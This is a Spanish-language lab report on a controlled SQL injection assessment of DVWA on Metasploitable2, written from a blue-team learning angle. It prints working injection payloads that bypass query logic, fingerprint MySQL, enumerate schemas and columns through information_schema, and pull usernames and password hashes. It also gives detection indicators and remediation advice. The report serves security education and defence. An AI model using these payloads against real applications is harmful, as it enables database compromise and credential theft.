
# Final Security Report — DVWA SQL Injection Assessment

**Author:** Tomas Guastavino

**Role Focus:** Blue Team / SOC Analyst / Application Security Learning Lab

**Environment:** Kali Linux → Metasploitable2 → DVWA

**Date:** 2026

---

# 1. Executive Summary

Durante este laboratorio se realizó una evaluación práctica de seguridad web sobre **DVWA (Damn Vulnerable Web Application)** desplegada en **Metasploitable2**.

La actividad tuvo como objetivo comprender técnicamente el comportamiento de una vulnerabilidad **SQL Injection**, documentar su explotación controlada y analizar el impacto desde una perspectiva defensiva.

La evaluación permitió confirmar que la aplicación presentaba una falla crítica de validación de entradas, posibilitando:

* Manipulación de consultas SQL.
* Enumeración del motor de base de datos.
* Descubrimiento de schemas internos.
* Enumeración de tablas y columnas.
* Acceso a información sensible.

---

# 2. Scope

## In-Scope Asset

| Asset           | Description                    |
| --------------- | ------------------------------ |
| DVWA            | Aplicación web vulnerable      |
| MySQL Backend   | Base de datos de la aplicación |
| Metasploitable2 | Host objetivo del laboratorio  |

---

# 3. Methodology

La actividad siguió un flujo manual de evaluación ofensiva controlada.

Fases ejecutadas:

1. Vulnerability Validation
2. Backend Fingerprinting
3. Schema Enumeration
4. Column Discovery
5. Controlled Data Extraction
6. Security Impact Assessment

---

# 4. Technical Findings

---

## Finding 01 — SQL Injection

### Severity

**Critical**

### Description

La aplicación permite insertar caracteres especiales dentro del parámetro vulnerable sin aplicar sanitización ni consultas parametrizadas.

Esto habilita modificación directa de la query SQL enviada al backend.

---

### Validation Payload

```sql id="dwrj1m"
1' OR '1'='1
```

---

### Result

La aplicación respondió exitosamente a la manipulación de la consulta.

Indicadores observados:

* Alteración del comportamiento esperado.
* Bypass de lógica SQL.
* Confirmación de inyección.

---

## Finding 02 — Database Fingerprinting

### Objective

Identificar tecnología backend.

### Payload

```sql id="du3ys0"
1' UNION SELECT version(),database()#
```

### Result

```txt id="w2km6a"
MySQL 5.0.51a
dvwa
```

---

### Security Relevance

Fingerprinting exitoso permite al atacante:

* Adaptar payloads específicos.
* Seleccionar técnicas compatibles.
* Optimizar explotación posterior.

---

## Finding 03 — Schema Enumeration

### Payload

```sql id="w2i6mw"
1' UNION SELECT table_name,table_schema
FROM information_schema.tables#
```

---

### Results

Schemas identificados:

#### dvwa

* users
* guestbook

#### mysql

* user
* db
* host

#### owasp10

* accounts
* credit_cards
* captured_data

---

### Security Impact

Un atacante puede mapear completamente la arquitectura lógica del sistema antes de extraer información sensible.

---

## Finding 04 — Column Discovery

### Payload

```sql id="8g9jlwm"
1' UNION SELECT column_name,table_name
FROM information_schema.columns
WHERE table_name='users'#
```

### Columns Found

* user_id
* first_name
* last_name
* user
* password
* avatar

---

### Security Impact

El descubrimiento de columnas habilita:

* Reconocimiento estructural.
* Preparación de extracción dirigida.
* Optimización de exfiltración de datos.

---

## Finding 05 — Credential Exposure

### Payload

```sql id="ndu0rk"
1' UNION SELECT user,password FROM users#
```

---

### Result

Se logró recuperar:

* usernames
* password hashes

---

### Security Impact

Compromiso potencial de:

* autenticación
* confidencialidad
* cuentas de usuario
* reutilización de credenciales

---

# 5. Risk Matrix

| Vulnerability         | Severity | Impact                 |
| --------------------- | -------- | ---------------------- |
| SQL Injection         | Critical | Complete DB compromise |
| Credential Exposure   | Critical | Account takeover       |
| Database Enumeration  | High     | Reconnaissance         |
| Weak Backend Controls | High     | Lateral exploitation   |

---

# 6. Defensive Analysis

Desde una perspectiva **Blue Team / SOC Analyst**, esta vulnerabilidad podría detectarse mediante:

## Web Logs

Indicadores:

```txt id="0h0jhs"
UNION SELECT
OR '1'='1
information_schema
version()
```

---

## SIEM Detection Rules

Ejemplos:

* Excessive HTTP parameter anomalies.
* SQL keyword detection.
* Multiple failed query patterns.
* Suspicious UNION activity.

---

## Monitoring Opportunities

* Apache access.log review.
* Web Application Firewall alerts.
* Database audit logs.
* Authentication anomaly monitoring.

---

# 7. Remediation Recommendations

## Application Layer

Implementar:

* Prepared Statements.
* Parameterized Queries.
* ORM frameworks.
* Input Validation.

---

## Database Layer

Aplicar:

* Least Privilege Accounts.
* Restricted permissions.
* Remove unnecessary grants.

---

## Detection Layer

Fortalecer:

* SIEM correlation rules.
* WAF deployment.
* Centralized logging.
* Alert engineering.

---

# 8. Lessons Learned

Este laboratorio permitió desarrollar experiencia práctica en:

* SQL Injection manual.
* Database enumeration.
* Web attack chains.
* Application Security fundamentals.
* Defensive thinking sobre vulnerabilidades web.

---

# 9. Conclusion

La evaluación confirmó una vulnerabilidad **SQL Injection crítica** capaz de comprometer completamente la capa de datos de la aplicación.

Aunque el ejercicio fue realizado en un entorno educativo controlado, refleja escenarios reales observados en evaluaciones de seguridad web y programas AppSec.

---

# Disclaimer

Laboratorio realizado exclusivamente con fines educativos dentro de infraestructura controlada.
